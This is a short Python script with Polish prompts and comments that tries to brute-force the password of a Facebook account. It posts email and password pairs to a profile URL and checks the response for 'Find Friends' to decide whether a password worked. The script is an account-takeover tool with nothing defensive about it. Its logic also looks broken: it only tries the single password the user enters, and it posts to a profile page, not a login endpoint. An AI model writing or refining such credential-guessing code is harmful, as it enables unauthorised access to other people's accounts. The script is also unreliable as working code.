import requests
import time
import getpass

def brute_force(username, fb_id, passwords):
    url = f'https://www.facebook.com/{fb_id}'

    with requests.Session() as session:
        for password in passwords:
            data = {'email': username, 'pass': password}

            response = session.post(url, data=data)
            
            # Dodaj opóźnienie między próbami
            time.sleep(1)

            if 'Find Friends' in response.text:
                print(f'Prawidłowe hasło znalezione: {password}')
                break
            else:
                print(f'Nieprawidłowe hasło: {password}')

def main():
    email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
    fb_id = input('Podaj identyfikator Facebooka: ')
    
    # Ukrywanie hasła podczas wprowadzania
    password = getpass.getpass('Podaj hasło: ')

    brute_force(email, fb_id, [password])

if __name__ == '__main__':
    main()
